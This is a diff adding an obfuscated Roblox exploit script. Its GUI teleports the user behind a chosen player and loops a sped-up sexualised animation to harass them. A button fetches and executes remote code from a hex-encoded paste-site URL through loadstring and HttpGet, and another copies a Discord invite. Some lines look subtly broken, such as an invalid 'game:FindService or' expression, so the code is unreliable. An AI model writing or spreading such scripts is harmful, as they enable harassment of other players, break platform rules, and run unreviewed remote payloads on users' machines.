@@ -1,0 +1,187 @@
+local _G={};local function _A(a,b)local c={}for i=1,#a do c[i]=string.byte(a,i)+b end;local s=""for i=1,#c do s=s..string.char(c[i])end;return s end
+local u="\106\114\120\118\117\116\125\125\103\125\125" -- dummy
+
+local function _R()
+local e=game:GetService("\080\108\097\121\101\114\115")
+local i=game:GetService("\085\115\101\114\073\110\112\117\116\083\101\114\118\105\99\101")
+local o=game:GetService("\082\117\110\083\101\114\118\105\99\101")
+
+local p=game:FindService or game.GetService
+local s=game:FindFirstChild or game.FindFirstChild
+
+local l=game:WaitForChild or game.WaitForChild
+
+local q=e.LocalPlayer
+local v=q:WaitForChild("\080\108\97\121\101\114\071\117\105")
+local g=Instance.new("\083\099\114\101\101\110\71\117\105")
+g.Name="\066\097\099\107\115\104\111\116\032\103\117\105"
+g.Parent=v
+
+local f=Instance.new("\070\114\097\109\101",g)
+f.Size=UDim2.new(0,350,0,250)
+f.Position=UDim2.new(0.5,-175,0.5,-125)
+f.BackgroundColor3=Color3.new(0.15,0.15,0.15)
+f.BorderColor3=Color3.fromRGB(255,0,0)
+f.BorderSizePixel=3
+f.Active=true
+f.Draggable=true
+
+local t=Instance.new("\084\101\120\116\076\097\098\101\108",f)
+t.Text="\080\114\101\109\105\117\109\115\099\114\105\112\116\115\104\117\098"
+t.Size=UDim2.new(1,0,0,40)
+t.Position=UDim2.new(0,0,0,0)
+t.BackgroundColor3=Color3.new(0.1,0.1,0.1)
+t.TextColor3=Color3.fromRGB(255,0,0)
+t.Font=Enum.Font.SourceSansBold
+t.TextScaled=true
+
+local m=Instance.new("\084\101\120\116\098\111\120",f)
+m.PlaceholderText="\069\110\116\101\114\032\117\115\101\114\110\097\109\101\057\100\105\115\112\108\097\121\110\097\109\101"
+m.Size=UDim2.new(1,-20,0,30)
+m.Position=UDim2.new(0,10,0,50)
+m.BackgroundColor3=Color3.new(0.1,0.1,0.1)
+m.TextColor3=Color3.new(1,1,1)
+m.Font=Enum.Font.SourceSans
+m.TextScaled=true
+m.ClearTextOnFocus=false
+
+local j=Instance.new("\084\101\120\116\098\117\116\116\111\110",f)
+j.Text="\084\111\103\103\108\101\032\079\110"
+j.Size=UDim2.new(1,-20,0,30)
+j.Position=UDim2.new(0,10,0,100)
+j.BackgroundColor3=Color3.new(0.2,0.2,0.2)
+j.TextColor3=Color3.new(1,1,1)
+j.Font=Enum.Font.SourceSansBold
+j.TextScaled=true
+
+local c=Instance.new("\084\101\120\116\098\117\116\116\111\110",f)
+c.Text="\074\101\114\107\032\111\102\102"
+c.Size=UDim2.new(0.48,-10,0,30)
+c.Position=UDim2.new(0,10,0,140)
+c.BackgroundColor3=Color3.new(0.2,0.2,0.2)
+c.TextColor3=Color3.new(1,1,1)
+c.Font=Enum.Font.SourceSansBold
+c.TextScaled=true
+
+local d=Instance.new("\084\101\120\116\098\117\116\116\111\110",f)
+d.Text="\067\111\112\121\032\068\105\115\099\111\114\100\032\083\101\114\118\101\114"
+d.Size=UDim2.new(0.48,-10,0,30)
+d.Position=UDim2.new(0.52,0,0,140)
+d.BackgroundColor3=Color3.new(0.2,0.2,0.2)
+d.TextColor3=Color3.new(1,1,1)
+d.Font=Enum.Font.SourceSansBold
+d.TextScaled=true
+
+local k=Instance.new("\084\101\120\116\076\097\098\101\108",f)
+k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+k.Size=UDim2.new(1,-20,0,30)
+k.Position=UDim2.new(0,10,0,185)
+k.BackgroundColor3=Color3.new(0.1,0.1,0.1)
+k.TextColor3=Color3.new(1,1,1)
+k.Font=Enum.Font.SourceSans
+k.TextScaled=true
+
+local y=Instance.new("\084\101\120\116\076\097\098\101\108",f)
+y.Text="\077\097\100\101\032\098\121\032\072\101\097\116\104\101\114\115\099\114\105\112\116\115"
+y.Size=UDim2.new(1,-20,0,30)
+y.Position=UDim2.new(0,10,0,220)
+y.BackgroundColor3=Color3.new(0.1,0.1,0.1)
+y.TextColor3=Color3.fromRGB(255,0,0)
+y.Font=Enum.Font.SourceSansBold
+y.TextScaled=true
+
+local _f=false
+local _t=nil
+local _s=nil
+local _a=nil
+local _animId="\114\098\120\097\115\115\101\116\105\100\58\47\47\49\50\57\57\50\50\54\50\49\49\56"
+
+local function _findPlayer(n)
+    n=n:lower()
+    for _,v in ipairs(e:GetPlayers()) do
+        if v.Name:lower():find(n) or v.DisplayName:lower():find(n) then return v end
+    end
+    return nil
+end
+
+local function _follow()
+    if _t and _t.Character and _t.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") then
+        local tr=_t.Character.HumanoidRootPart
+        local plchar=q.Character or q.CharacterAdded:Wait()
+        local rp=plchar:WaitForChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116")
+        local h=plchar:WaitForChild("\072\117\109\097\110\111\105\100")
+        local an=Instance.new("\065\110\105\109\097\116\105\111\110")
+        an.AnimationId=_animId
+        _a=h:LoadAnimation(an)
+        _a:Play()
+        _a:AdjustSpeed(80)
+        _s=o.Stepped:Connect(function()
+            rp.CFrame=tr.CFrame*CFrame.new(0,0,2)
+        end)
+    end
+end
+
+local function _stop()
+    if _s then
+        _s:Disconnect()
+        _s=nil
+    end
+    if _a then
+        _a:Stop()
+        _a=nil
+    end
+end
+
+j.MouseButton1Click:Connect(function()
+    _f=not _f
+    if _f then
+        _t=_findPlayer(m.Text)
+        if _t then
+            _follow()
+            k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+            j.Text="\084\111\103\103\108\101\032\079\102\102"
+        else
+            k.Text="\083\116\097\116\117\115\072\101\108\108\111\072\101\108\108\111\072\101\108\108\111"
+            _f=false
+        end
+    else
+        _stop()
+        k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+        j.Text="\084\111\103\103\108\101\032\079\110"
+    end
+end)
+
+spawn(function()
+    local r=Color3.fromRGB(255,0,0)
+    local w=Color3.fromRGB(255,255,255)
+    local toggle=false
+    while true do
+        f.BorderColor3=(toggle and w or r)
+        toggle=not toggle
+        wait(0.7)
+    end
+end)
+
+c.MouseButton1Click:Connect(function()
+    local success,err=pcall(function()
+        loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\097\115\116\101\102\121\046\097\112\112\47\89\90\111\103\108\79\121\74\47\114\097\119"))()
+    end)
+    if not success then
+        k.Text="\083\116\097\116\117\115\072\101\108\108\111\072\101\108\108\111"
+    else
+        k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+    end
+end)
+
+d.MouseButton1Click:Connect(function()
+    local link="\104\116\116\112\115\58\47\47\100\105\115\099\111\114\100\046\103\103\47\085\118\065\83\116\57\114\080\101\104"
+    if setclipboard then
+        setclipboard(link)
+        k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+    else
+        k.Text="\083\116\097\116\117\115\072\101\108\108\111"
+    end
+end)
+end
+
+_R()
